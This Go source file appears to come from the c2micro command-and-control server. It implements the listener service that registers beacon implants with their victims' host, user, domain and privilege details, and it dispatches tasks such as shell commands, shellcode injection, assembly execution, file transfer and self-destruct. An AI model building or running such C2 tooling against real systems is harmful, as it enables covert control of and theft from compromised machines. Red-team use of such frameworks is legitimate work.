package listener

import (
	"context"
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/c2micro/c2mshr/defaults"
	commonv1 "github.com/c2micro/c2mshr/proto/gen/common/v1"
	listenerv1 "github.com/c2micro/c2mshr/proto/gen/listener/v1"
	operatorv1 "github.com/c2micro/c2mshr/proto/gen/operator/v1"
	"github.com/c2micro/c2msrv/internal/constants"
	"github.com/c2micro/c2msrv/internal/ent"
	"github.com/c2micro/c2msrv/internal/ent/beacon"
	"github.com/c2micro/c2msrv/internal/ent/blobber"
	"github.com/c2micro/c2msrv/internal/ent/task"
	"github.com/c2micro/c2msrv/internal/middleware/grpcauth"
	"github.com/c2micro/c2msrv/internal/pools"
	"github.com/c2micro/c2msrv/internal/shared"
	"github.com/c2micro/c2msrv/internal/types"
	"github.com/c2micro/c2msrv/internal/utils"
	"github.com/c2micro/c2msrv/internal/webhook"
	"go.uber.org/zap"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
	"google.golang.org/protobuf/types/known/timestamppb"
	"google.golang.org/protobuf/types/known/wrapperspb"
)

type server struct {
	listenerv1.UnimplementedListenerServiceServer
	db *ent.Client
	lg *zap.Logger
}

// Обновление информации о листенере
func (s *server) UpdateListener(ctx context.Context, req *listenerv1.UpdateListenerRequest) (*listenerv1.UpdateListenerResponse, error) {
	lid := grpcauth.ListenerFromCtx(ctx)
	lg := s.lg.Named("UpdateListener").With(zap.Int("listener-id", lid))

	// получение объекта листенера
	m := s.db.Listener.UpdateOneID(lid)

	// name
	if req.GetName() != nil {
		if len(req.GetName().GetValue()) > defaults.ListenerNameMaxLength {
			m.SetName(req.GetName().GetValue()[:defaults.ListenerNameMaxLength])
		} else {
			m.SetName(req.GetName().GetValue())
		}
	}
	// ip
	if req.GetIp() != nil {
		ip := types.Inet{}
		if err := ip.Scan(req.GetIp().GetValue()); err != nil {
			// игнорируем ошибку и продолжаем
			lg.Warn(shared.ErrorParseIP, zap.Error(err))
		} else {
			m.SetIP(ip)
		}
	}
	// port
	if req.GetPort() != nil {
		m.SetPort(uint16(req.GetPort().GetValue()))
	}

	// сохраняем изменения
	l, err := m.Save(ctx)
	if err != nil {
		lg.Error(shared.ErrorUpdateListener, zap.Error(err))
		return nil, status.Errorf(codes.Internal, shared.ErrorDB)
	}

	// нотифицируем всех подписчиков о смене информации листенера
	go pools.Pool.Listeners.Send(pools.ToListenerInfoResponse(l))

	return &listenerv1.UpdateListenerResponse{}, nil
}

// Регистрация нового бикона
func (s *server) NewBeacon(ctx context.Context, req *listenerv1.NewBeaconRequest) (*listenerv1.NewBeaconResponse, error) {
	lid := grpcauth.ListenerFromCtx(ctx)
	lg := s.lg.Named("NewBeacon").With(zap.Int("listener-id", lid))

	// создаем транзакцию
	tx, err := s.db.Tx(ctx)
	if err != nil {
		lg.Error(shared.ErrorBeginTx, zap.Error(err))
		return nil, status.Error(codes.Internal, shared.ErrorDB)
	}

	// проверяем, что бикона с таким id не существует
	_, err = tx.Beacon.Query().Where(beacon.Bid(req.GetId())).OnlyID(ctx)
	if err != nil {
		if !ent.IsNotFound(err) {
			lg.Error(shared.ErrorQueryBeaconFromDB, zap.Error(err))
			if err = tx.Rollback(); err != nil {
				lg.Error(shared.ErrorRollbackTx, zap.Error(err))
			}
			return nil, status.Error(codes.Internal, shared.ErrorDB)
		}
	} else {
		// если бикон существует - возвращаем ошибку
		lg.Warn(shared.ErrorBeaconAlreadyExists)
		if err = tx.Rollback(); err != nil {
			lg.Error(shared.ErrorRollbackTx, zap.Error(err))
		}
		return nil, status.Error(codes.AlreadyExists, shared.ErrorBeaconAlreadyExists)
	}

	// получение объекта листенера
	l, err := tx.Listener.Get(ctx, lid)
	if err != nil {
		lg.Error(shared.ErrorQueryListenerFromDB, zap.Error(err))
		if err = tx.Rollback(); err != nil {
			lg.Error(shared.ErrorRollbackTx, zap.Error(err))
		}
		return nil, status.Errorf(codes.Internal, shared.ErrorDB)
	}

	// начало заполнения структуры бикона
	b := tx.Beacon.Create()

	// id
	b.SetBid(req.GetId())
	// listener_id
	b.SetListener(l)
	// ext_ip
	if req.GetExtIp() != nil {
		ip := types.Inet{}
		if err = ip.Scan(req.GetExtIp().GetValue()); err != nil {
			// если ошибка -> продолжаем
			lg.Warn(shared.ErrorParseExtIP, zap.Error(err))
		} else {
			b.SetExtIP(ip)
		}
	}
	// int_ip
	if req.GetIntIp() != nil {
		ip := types.Inet{}
		if err = ip.Scan(req.GetIntIp().GetValue()); err != nil {
			// если ошибка -> продолжаем
			lg.Warn(shared.ErrorParseIntIP, zap.Error(err))
		} else {
			b.SetIntIP(ip)
		}
	}
	// os
	b.SetOs(defaults.BeaconOS(req.GetOs()))
	// os_meta
	if req.GetOsMeta() != nil {
		if len(req.GetOsMeta().GetValue()) > defaults.BeaconOsMetaMaxLength {
			b.SetOsMeta(req.GetOsMeta().GetValue()[:defaults.BeaconOsMetaMaxLength])
		} else {
			b.SetOsMeta(req.GetOsMeta().GetValue())
		}
	}
	// hostname
	if req.GetHostname() != nil {
		if len(req.GetHostname().GetValue()) > defaults.BeaconHostnameMaxLength {
			b.SetHostname(req.GetHostname().GetValue()[:defaults.BeaconHostnameMaxLength])
		} else {
			b.SetHostname(req.GetHostname().GetValue())
		}
	}
	// username
	if req.GetUsername() != nil {
		if len(req.GetUsername().GetValue()) > defaults.BeaconUsernameMaxLength {
			b.SetUsername(req.GetUsername().GetValue()[:defaults.BeaconUsernameMaxLength])
		} else {
			b.SetUsername(req.GetUsername().GetValue())
		}
	}
	// domain
	if req.GetDomain() != nil {
		if len(req.GetDomain().GetValue()) > defaults.BeaconDomainMaxLength {
			b.SetDomain(req.GetDomain().GetValue()[:defaults.BeaconDomainMaxLength])
		} else {
			b.SetDomain(req.GetDomain().GetValue())
		}
	}
	// privileged
	if req.GetPrivileged() != nil {
		b.SetPrivileged(req.GetPrivileged().GetValue())
	}
	// proc_name
	if req.GetProcName() != nil {
		if len(req.GetProcName().GetValue()) > defaults.BeaconProcessNameMaxLength {
			b.SetProcessName(req.GetProcName().GetValue()[:defaults.BeaconProcessNameMaxLength])
		} else {
			b.SetProcessName(req.GetProcName().GetValue())
		}
	}
	// pid
	if req.GetPid() != nil {
		b.SetPid(req.GetPid().GetValue())
	}
	// arch
	b.SetArch(defaults.BeaconArch(req.GetArch()))
	// sleep
	b.SetSleep(req.GetSleep())
	// jitter
	b.SetJitter(uint8(req.GetJitter()))
	// caps
	b.SetCaps(req.GetCaps())
	// цвет
	b.SetColor(constants.DefaultColor)

	// сохраняем
	var bs *ent.Beacon
	if bs, err = b.Save(ctx); err != nil {
		lg.Error(shared.ErrorSaveBeacon, zap.Error(err))
		if err = tx.Rollback(); err != nil {
			lg.Error(shared.ErrorRollbackTx, zap.Error(err))
		}
		return nil, status.Error(codes.Internal, shared.ErrorDB)
	}

	// сохраняем сообщение
	bh := bs.Hostname
	if bh == "" {
		bh = hex.EncodeToString([]byte(strconv.Itoa(int(bs.Bid))))
	}
	bu := bs.Username
	if bu == "" {
		bu = "[unknown]"
	}
	bi := bs.IntIP.String()
	if bi == "" {
		bi = "[unknown]"
	}
	ch, err := tx.Chat.
		Create().
		SetMessage(fmt.Sprintf("new beacon %s@%s (%s)", bu, bi, bh)).
		Save(ctx)
	if err != nil {
		lg.Error(shared.ErrorSaveChatMessage, zap.Error(err))
		if err = tx.Rollback(); err != nil {
			lg.Error(shared.ErrorRollbackTx, zap.Error(err))
		}
		return nil, status.Error(codes.Internal, shared.ErrorDB)
	}

	// коммитим транзакцию
	if err = tx.Commit(); err != nil {
		lg.Error(shared.ErrorCommitTx, zap.Error(err))
		return nil, status.Error(codes.Internal, shared.ErrorDB)
	}

	// рассылаем новое сообщение для подписчиков
	go pools.Pool.Chat.Send(&operatorv1.ChatResponse{
		CreatedAt: timestamppb.New(ch.CreatedAt),
		From:      defaults.ChatSrvFrom,
		Message:   ch.Message,
	})

	// рассылаем нового бикона для подписчиков
	go pools.Pool.Beacons.Send(&operatorv1.BeaconResponse{
		Bid:        bs.Bid,
		Lid:        int64(l.ID),
		ExtIp:      wrapperspb.String(bs.ExtIP.String()),
		IntIp:      wrapperspb.String(bs.IntIP.String()),
		Os:         uint32(bs.Os),
		OsMeta:     wrapperspb.String(bs.OsMeta),
		Hostname:   wrapperspb.String(bs.Hostname),
		Username:   wrapperspb.String(bs.Username),
		Domain:     wrapperspb.String(bs.Domain),
		Privileged: wrapperspb.Bool(bs.Privileged),
		ProcName:   wrapperspb.String(bs.ProcessName),
		Pid:        wrapperspb.UInt32(bs.Pid),
		Arch:       uint32(bs.Arch),
		Sleep:      bs.Sleep,
		Jitter:     uint32(bs.Jitter),
		Caps:       bs.Caps,
		Color:      wrapperspb.UInt32(bs.Color),
		Note:       wrapperspb.String(bs.Note),
		First:      timestamppb.New(bs.First),
		Last:       timestamppb.New(bs.Last),
	})

	// дергаем вебхук
	webhook.Webhook.Send(&webhook.TemplateData{
		Bid:        int(bs.Bid),
		ExternalIP: bs.ExtIP.String(),
		InternalIP: bs.IntIP.String(),
		Username:   bs.Username,
		Hostname:   bs.Hostname,
		Domain:     bs.Domain,
		Privileged: bs.Privileged,
	})

	return &listenerv1.NewBeaconResponse{}, nil
}

// Получение таска для бикона из очереди
func (s *server) GetTask(ctx context.Context, req *listenerv1.GetTaskRequest) (*listenerv1.GetTaskResponse, error) {
	lid := grpcauth.ListenerFromCtx(ctx)
	lg := s.lg.Named("GetTask").With(zap.Int("listener-id", lid))

	// ищем бикон по его id
	b, err := s.db.Beacon.
		Query().
		Where(beacon.BidEQ(req.GetBid())).
		Only(ctx)
	if err != nil {
		if !ent.IsNotFound(err) {
			lg.Error("unable query beacon from DB", zap.Error(err))
			return nil, status.Error(codes.Internal, "failed to query beacon")
		} else {
			lg.Error("requested tasks for unknown beacon")
			return nil, status.Error(codes.InvalidArgument, "unknown beacon")
		}
	}

	// обновляем время последней активности бикона
	b, err = b.Update().
		SetLast(time.Now()).
		Save(ctx)
	if err != nil {
		lg.Error("update last checkout for beacon", zap.Error(err))
		return nil, status.Error(codes.Internal, "unable process beacon")
	}

	// рассылаем подписчикам обновление времени последнего чекаута бикона
	go pools.Pool.Beacons.Send(pools.ToBeaconLastResponse(b))

	// получаем первый таск в очереди для бикона
	t, err := s.db.Task.
		Query().
		WithBlobberArgs().
		Where(task.BidEQ(b.ID)).
		Where(task.StatusEQ(defaults.StatusNew)).
		Order(task.ByCreatedAt()).
		First(ctx)
	if err != nil {
		if ent.IsNotFound(err) {
			// если нет тасков - просто возвращаем nil
			return nil, nil
		}
		lg.Error("query task for beacon from DB", zap.Error(err))
		return nil, status.Error(codes.Internal, "unable fetch task from DB")
	}

	// проверяем, что response подтянулись
	blob, err := t.Edges.BlobberArgsOrErr()
	if err != nil {
		lg.Error("get arguments blob for task", zap.Error(err))
		return nil, status.Error(codes.Internal, "unable process task from DB")
	}

	// готовим данные для отдачи
	response := &listenerv1.GetTaskResponse{
		Tid: int64(t.ID),
		Cap: uint32(t.Cap),
	}
	switch t.Cap {
	case defaults.CAP_SLEEP:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Sleep{
				Sleep: v.(*commonv1.CapSleep),
			}
		}
	case defaults.CAP_LS:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Ls{
				Ls: v.(*commonv1.CapLs),
			}
		}
	case defaults.CAP_PWD:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Pwd{
				Pwd: v.(*commonv1.CapPwd),
			}
		}
	case defaults.CAP_CD:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Cd{
				Cd: v.(*commonv1.CapCd),
			}
		}
	case defaults.CAP_WHOAMI:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Whoami{
				Whoami: v.(*commonv1.CapWhoami),
			}
		}
	case defaults.CAP_PS:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Ps{
				Ps: v.(*commonv1.CapPs),
			}
		}
	case defaults.CAP_CAT:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Cat{
				Cat: v.(*commonv1.CapCat),
			}
		}
	case defaults.CAP_EXEC:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Exec{
				Exec: v.(*commonv1.CapExec),
			}
		}
	case defaults.CAP_CP:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Cp{
				Cp: v.(*commonv1.CapCp),
			}
		}
	case defaults.CAP_JOBS:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Jobs{
				Jobs: v.(*commonv1.CapJobs),
			}
		}
	case defaults.CAP_JOBKILL:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Jobkill{
				Jobkill: v.(*commonv1.CapJobkill),
			}
		}
	case defaults.CAP_KILL:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Kill{
				Kill: v.(*commonv1.CapKill),
			}
		}
	case defaults.CAP_MV:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Mv{
				Mv: v.(*commonv1.CapMv),
			}
		}
	case defaults.CAP_MKDIR:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Mkdir{
				Mkdir: v.(*commonv1.CapMkdir),
			}
		}
	case defaults.CAP_RM:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Rm{
				Rm: v.(*commonv1.CapRm),
			}
		}
	case defaults.CAP_EXEC_ASSEMBLY:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_ExecAssembly{
				ExecAssembly: v.(*commonv1.CapExecAssembly),
			}
		}
	case defaults.CAP_SHELLCODE_INJECTION:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_ShellcodeInjection{
				ShellcodeInjection: v.(*commonv1.CapShellcodeInjection),
			}
		}
	case defaults.CAP_DOWNLOAD:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Download{
				Download: v.(*commonv1.CapDownload),
			}
		}
	case defaults.CAP_UPLOAD:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Upload{
				Upload: v.(*commonv1.CapUpload),
			}
		}
	case defaults.CAP_PAUSE:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Pause{
				Pause: v.(*commonv1.CapPause),
			}
		}
	case defaults.CAP_DESTRUCT:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Destruct{
				Destruct: v.(*commonv1.CapDestruct),
			}
		}
	case defaults.CAP_EXEC_DETACH:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_ExecDetach{
				ExecDetach: v.(*commonv1.CapExecDetach),
			}
		}
	case defaults.CAP_SHELL:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Shell{
				Shell: v.(*commonv1.CapShell),
			}
		}
	case defaults.CAP_PPID:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Ppid{
				Ppid: v.(*commonv1.CapPpid),
			}
		}
	case defaults.CAP_EXIT:
		if v, err := t.Cap.Unmarshal(blob.Blob); err != nil {
			lg.Error("unable unmarshal task arguments to proto", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable unmarshal arguments")
		} else {
			response.Args = &listenerv1.GetTaskResponse_Exit{
				Exit: v.(*commonv1.CapExit),
			}
		}
	default:
		lg.Error("unknown capability to unmarshal", zap.String("cap", t.Cap.String()))
		return nil, status.Error(codes.Internal, "unable unmarshal arguments")
	}

	// обновляем время пуша таска и статус
	t, err = t.Update().
		SetPushedAt(time.Now()).
		SetStatus(defaults.StatusInProgress).
		Save(ctx)
	if err != nil {
		lg.Error("unable update task info for push", zap.Error(err))
		return nil, status.Error(codes.Internal, "unable process task from DB")
	}

	// нотификация подписчиков об изменении статуса таска
	go pools.Pool.Tasks.Send(&operatorv1.TasksStatusResponse{
		Gid:    int64(t.Gid),
		Tid:    int64(t.ID),
		Bid:    b.Bid,
		Status: uint32(t.Status),
	})

	return response, nil
}

// Сохранение результата выполнения таска
func (s *server) PutResult(ctx context.Context, req *listenerv1.PutResultRequest) (*listenerv1.PutResultResponse, error) {
	lid := grpcauth.ListenerFromCtx(ctx)
	lg := s.lg.Named("PutResult").With(zap.Int("listener-id", lid))

	// ищем бикон по его id
	b, err := s.db.Beacon.
		Query().
		Where(beacon.BidEQ(req.GetBid())).
		Only(ctx)
	if err != nil {
		if !ent.IsNotFound(err) {
			lg.Error("unable query beacon from DB", zap.Error(err))
			return nil, status.Error(codes.Internal, "failed to query beacon")
		} else {
			lg.Error("requested tasks for unknown beacon")
			return nil, status.Error(codes.InvalidArgument, "unknown beacon")
		}
	}

	// обновляем время последней активности бикона
	b, err = b.Update().
		SetLast(time.Now()).
		Save(ctx)
	if err != nil {
		lg.Error("update last checkout for beacon", zap.Error(err))
		return nil, status.Error(codes.Internal, "unable process beacon")
	}

	// рассылаем подписчикам обновление времени последнего чекаута бикона
	go pools.Pool.Beacons.Send(pools.ToBeaconLastResponse(b))

	// получаем таск
	t, err := s.db.Task.
		Query().
		Where(task.IDEQ(int(req.GetTid()))).
		Only(ctx)
	if err != nil {
		if !ent.IsNotFound(err) {
			lg.Error("query task from DB", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable query task from DB")
		}
		lg.Error("unknown task id to save output")
		return nil, status.Error(codes.InvalidArgument, "unknown task id")
	}

	if t.Status != defaults.StatusInProgress {
		// если статус таска отличается от in-progress -> дропаем, ибо это выходит за рамки модели работы
		lg.Warn("attempt to save output for task with invalid status")
		return nil, status.Error(codes.InvalidArgument, "invalid task id")
	}

	if defaults.TaskStatus(req.GetStatus()) == defaults.StatusNew {
		// если передаваемый биконом статус таска NEW -> дропаем, ибо это выходит за рамки модели работы
		lg.Warn("attempt to update task with invalid status")
		return nil, status.Error(codes.InvalidArgument, "invalid task status")
	}

	// имя файла для хранения временного output
	n := constants.TempTaskOutputPrefix + fmt.Sprintf("%d", t.ID)

	if defaults.TaskStatus(req.GetStatus()) == defaults.StatusInProgress {
		// если статус таска in-progress -> сохраняем output во временный файл
		if req.GetOutput() != nil {
			f, err := os.OpenFile(n, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
			if err != nil {
				lg.Error("unable open file to save temp output", zap.Error(err))
				return nil, status.Error(codes.Internal, "unable save output")
			}
			defer func() {
				if err = f.Close(); err != nil {
					lg.Warn("close file with temp output", zap.Error(err))
				}
			}()
			if _, err = f.Write(req.GetOutput().GetValue()); err != nil {
				lg.Error("unable write output in temp file", zap.Error(err))
				return nil, status.Error(codes.Internal, "unable save output")
			}
			// TODO нотификация подписчиков о получение output'a (надо дополнительно вычитывать файл)
		}
	} else {
		// сохраняем output в БД и закрываем таск
		data, err := os.ReadFile(n)
		if err != nil {
			if !os.IsNotExist(err) {
				lg.Error("unable read file with temp output", zap.Error(err))
				return nil, status.Error(codes.Internal, "unable save output")
			}
			if req.GetOutput() != nil {
				data = req.GetOutput().GetValue()
			}
		} else {
			if req.GetOutput() != nil {
				data = append(data, req.GetOutput().GetValue()...)
			}
		}
		// чтобы избежать NOT NULL constraint
		if data == nil {
			data = []byte{}
		}
		// сохраняем блоб
		h := utils.CalcHash(data)
		blob, err := s.db.Blobber.
			Query().
			Where(blobber.HashEQ(h)).
			Only(ctx)
		if err != nil {
			if ent.IsNotFound(err) {
				// создание блоба
				blob, err = s.db.Blobber.
					Create().
					SetBlob(data).
					SetHash(h).
					SetSize(len(data)).
					Save(ctx)
				if err != nil {
					lg.Error("create blob in DB", zap.Error(err))
					return nil, status.Error(codes.Internal, "create blob in DB")
				}
			} else {
				lg.Error("query blob from DB", zap.Error(err))
				return nil, status.Error(codes.Internal, "unable query blob from DB")
			}
		}
		// сохраняем обновленный таск
		t, err = t.Update().
			SetBlobberOutput(blob).
			SetOutputBig(blob.Size > defaults.TaskOutputMaxShowSize).
			SetDoneAt(time.Now()).
			SetStatus(defaults.TaskStatus(req.GetStatus())).
			Save(ctx)
		if err != nil {
			lg.Error("save task", zap.Error(err))
			return nil, status.Error(codes.Internal, "unable save task")
		}
		// нотифицируем подписчиков о закрытии таска
		x := &operatorv1.TasksDoneResponse{
			Gid:       int64(t.Gid),
			Tid:       int64(t.ID),
			Bid:       b.Bid,
			Status:    uint32(t.Status),
			OutputBig: t.OutputBig,
			OutputLen: int64(blob.Size),
		}
		if !t.OutputBig {
			x.Output = wrapperspb.Bytes(blob.Blob)
		}
		go pools.Pool.Tasks.Send(x)
		// обновляем БД и нотифицируем подписчиков, если результат таска был на изменение sleep у бикона
		if t.Cap == defaults.CAP_SLEEP {
			sleepBlob, err := s.db.Blobber.
				Query().
				Where(blobber.IDEQ(t.Args)).
				Only(ctx)
			if err != nil {
				lg.Error("Unable query sleep blob from DB", zap.Error(err))
			} else {
				if v, err := t.Cap.Unmarshal(sleepBlob.Blob); err != nil {
					lg.Error("unable unmarshal task sleep arguments to proto", zap.Error(err))
				} else {
					x := v.(*commonv1.CapSleep)
					bU, err := b.Update().
						SetSleep(x.GetSleep()).
						SetJitter(uint8(x.GetJitter())).
						Save(ctx)
					if err != nil {
						lg.Error("unable update beacon to save new sleep/jitter values", zap.Error(err))
					} else {
						go pools.Pool.Beacons.Send(&operatorv1.BeaconSleepResponse{
							Bid:    b.Bid,
							Sleep:  bU.Sleep,
							Jitter: uint32(bU.Jitter),
						})
					}
				}
			}
		}
	}

	return &listenerv1.PutResultResponse{}, nil
}
